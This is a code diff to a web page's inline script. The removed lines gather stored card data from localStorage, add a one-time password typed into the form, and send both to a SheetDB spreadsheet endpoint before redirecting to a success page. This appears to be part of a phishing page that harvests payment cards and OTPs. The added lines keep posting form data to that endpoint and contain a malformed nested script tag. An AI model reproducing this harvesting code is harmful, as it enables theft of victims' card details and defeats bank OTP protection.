@@ -136,36 +136,22 @@
 
 </body>
 <script>
-  var form = document.getElementById('sheetdb-form');
-  form.addEventListener("submit", function(e) {
-    e.preventDefault();
+ <script>
+            var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            window.open('success.html', '_blank');
 
-    // Load stored card data
-    const cardData = JSON.parse(localStorage.getItem('cardData')) || {};
-    const formData = new FormData();
-
-    // Merge card data
-    for (const key in cardData) {
-      formData.append(key, cardData[key]);
-    }
-
-    // Add OTP from current form
-    const otpValue = document.getElementById('otp').value;
-    formData.append('data[OTP]', otpValue);
-
-    // Submit all to SheetDB
-    fetch(form.action, {
-      method: "POST",
-      body: formData
-    })
-    .then(response => response.json())
-    .then(() => {
-      localStorage.removeItem('cardData'); // Clean up
-      // Redirect to success page in same tab
-      window.location.href = 'success.html';
-    });
-  });
-</script>
+          });
+        });
+ </script>
 
 
 
